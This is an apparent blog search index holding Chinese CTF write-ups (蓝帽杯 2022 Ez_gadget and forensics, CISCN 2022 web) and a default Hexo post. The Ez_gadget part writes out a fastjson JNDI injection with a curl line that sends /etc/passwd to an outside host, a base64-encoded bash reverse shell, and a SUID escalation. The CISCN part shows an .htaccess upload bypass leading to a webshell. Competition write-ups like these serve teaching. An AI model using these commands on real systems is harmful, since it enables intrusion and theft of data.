[{"title":"蓝帽杯2022_Web_网站取证","url":"/2022/07/12/蓝帽杯2022-Web-网站取证/","content":"\n# 蓝帽杯——Web&网站取证\n\n## Ez_gadget\n\n/json路由下，有个这样的判断\n\n```java\n  if (str != null && Objects.hashCode(str) == secret.getKey().hashCode() && !secret.getKey().equals(str)) \n```\n\n这个牵扯到hashcode相同，但是字符串不一样，和md5弱碰撞有点像\n\n找到这个博客：https://blog.csdn.net/weixin_44245828/article/details/109853439\n\n![img](https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301787.png)\n\n根据博客内容将key:BHUCCIx2zF9mMpJ7进行调整，调整为BHUBbIx2zF9mMpJ7\n\n一个值的ascii差了1，然后紧跟着就整一个ascii大31字母的进行`补偿`，其余不变\n\n```java\n java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'curl http://ip:7010 -Fe=@/etc/passwd' -A \"ip\"\n```\n\n![img](https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301244.png)\n\n发包，注意用unicode编码\n\n```java\n str=xH8b2iQfPbGejJgs&input={\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"rmi://ip:1099/cw3nmu\"}\n```\n\n尝试外带文件，测试/etc/passwd\n\n```java\n str=BHUBbIx2zF9mMpJ7&input={\"@type\":\"\\u006f\\u0072\\u0067\\u002e\\u0061\\u0070\\u0061\\u0063\\u0068\\u0065\\u002e\\u0078\\u0062\\u0065\\u0061\\u006e\\u002e\\u0070\\u0072\\u006f\\u0070\\u0065\\u0072\\u0074\\u0079\\u0065\\u0064\\u0069\\u0074\\u006f\\u0072\\u002e\\u004a\\u006e\\u0064\\u0069\\u0043\\u006f\\u006e\\u0076\\u0065\\u0072\\u0074\\u0065\\u0072\",\"AsText\":\"\\u0072\\u006d\\u0069\\u003a\\u002f\\u002f\\u0031\\u0031\\u0036\\u002e\\u0036\\u0032\\u002e\\u0032\\u0034\\u0030\\u002e\\u0031\\u0034\\u0038\\u003a\\u0031\\u0030\\u0039\\u0039\\u002f\\u0063\\u0077\\u0033\\u006e\\u006d\\u0075\"}\n```\n\n![img](https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301428.png)\n\n反弹shell\n\n```java\n java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzExNi42Mi4yNDAuMTQ4LzcwMTAgMD4mMQ==}|{base64,-d}|{bash,-i}' -A \"ip\"\n```\n\n![img](https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301502.png)\n\n```java\n str=BHUBbIx2zF9mMpJ7&input={\"@type\":\"\\u006f\\u0072\\u0067\\u002e\\u0061\\u0070\\u0061\\u0063\\u0068\\u0065\\u002e\\u0078\\u0062\\u0065\\u0061\\u006e\\u002e\\u0070\\u0072\\u006f\\u0070\\u0065\\u0072\\u0074\\u0079\\u0065\\u0064\\u0069\\u0074\\u006f\\u0072\\u002e\\u004a\\u006e\\u0064\\u0069\\u0043\\u006f\\u006e\\u0076\\u0065\\u0072\\u0074\\u0065\\u0072\",\"AsText\":\"\\u0072\\u006d\\u0069\\u003a\\u002f\\u002f\\u0031\\u0031\\u0036\\u002e\\u0036\\u0032\\u002e\\u0032\\u0034\\u0030\\u002e\\u0031\\u0034\\u0038\\u003a\\u0031\\u0030\\u0039\\u0039\\u002f\\u0061\\u006f\\u006a\\u0035\\u0072\\u0068\"}\n```\n\n监听7010端口，反弹shell\n\n![img](https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301250.png)\n\n但是权限有问题，根目录下没有flag文件，想到之前的一个提权学习\n\n[JerseyCTF 2022 / mist – root-me – it-sec.fail](https://www.it-sec.fail/jerseyctf-2022-mist-root-me/)\n\n![img](https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301512.png)\n\n模仿打一遍就可以了\n\n```bash\n find / -perm -u=s -type f 2>/dev/null\n date -f /root/flag.txt\n```\n\n![img](https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301557.png)\n\n## 取证\n\n顺带写一下部分网站取证部分\n\n### 网站取证1\n\nvscode搜索_POST，发现一句话木马\n\n![img](https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122303763.png)\n\nlanmaobei666\n\n### 网站取证2\n\n加密解密处理时 mcrypt_module_open()函数在7.1中被贬低，将在7.2中被移除，要用openssl_decrypt()函数代替。换用php5\n\n```php\n <?php\n function my_encrypt(){\n     $str = 'P3LMJ4uCbkFJ/RarywrCvA==';\n     $str = str_replace(array(\"/r/n\", \"/r\", \"/n\"), \"\", $str);\n     $key = 'PanGuShi';\n     $iv = substr(sha1($key),0,16);\n     $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,\"\",MCRYPT_MODE_CBC,\"\");\n     mcrypt_generic_init($td, \"PanGuShi\", $iv);\n     $decode = base64_decode($str);\n     $dencrypted = mdecrypt_generic($td, $decode);\n     mcrypt_generic_deinit($td);\n     mcrypt_module_close($td);\n     $dencrypted = trim($dencrypted);\n     return $dencrypted;\n }\n echo my_encrypt();\n //KBLT123\n```\n\nKBLT123\n\n\n\n### 网站取证3\n\n找到加密函数，有个`$key`，就是salt值\n\n![img](https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122305575.png)\n\njyzg123456\n\n\n\n### 网站取证4\n\n数据库中的money是加密的，不能直接进行加减，找到解密函数\n\n![img](https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122305749.png)\n\nbak.sql数据库中保存有汇率信息\n\n![image-20220712230533295](https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122305792.png)\n\n转账部分，转账的金额需要用上面的解密函数进行解密，编号2，3，4，5是对应的人员，这一点对应一下即可\n\n![image-20220712230614304](https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122306697.png)\n\n根据这些内容，写脚本算出最终的转账数目即可\n","tags":["蓝帽杯","2022","fastjson","网站取证"],"categories":["比赛wp"]},{"title":"ciscn2022华中赛区web部分wp","url":"/2022/07/12/ciscn2022华中赛区web部分wp/","content":"\n# ciscn2022华中分区web部分wp\n\n[toc]\n\n## FakeUpload1\n\n题目描述：嘶，长得好像上传呀。提交 flag 格式：flag{xxxx}。URL：http://该题目IP为Web赛题中【ctf赛题环境】的IP:58002\n\n\n\n不是文件上传，是文件读取\n\n当访问pics/1.jpg的时候，url变为了`reader.php?filename=pics/1.jpg`\n\n所以直接修改报文，读取flag.php\n\n![image-20220712213531916](https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122140635.png)\n\n## Identity23\n\n题目端口58003\n\n\n\ndisearch扫描\n\n![image-20220712213222584](https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150893.png)\n\n传参，找到一个php  A0ther_hldden_PaGe.php\n\n![img](https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150845.png)\n\n访问  A0ther_hldden_PaGe.php  可以上传文件，有一些防护\n\n上传`.htaccess`文件\n\n![img](https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150456.png)\n\n```php\nAddType application/x-httpd-php .jpg   \n```\n\n然后上传，注意修改报文\n\n![img](https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150923.png)\n\n传一个图片马1.jpg\n\n然后蚁剑连接  因为1.jpg是之前上传的图片马，现在被当作php解析了\n\n蚁剑连接  查看该文件即可\n\n![img](https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150519.png)\n","tags":["ciscn2022","Web"],"categories":["比赛wp"]},{"title":"Hello World","url":"/2022/07/11/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n"}]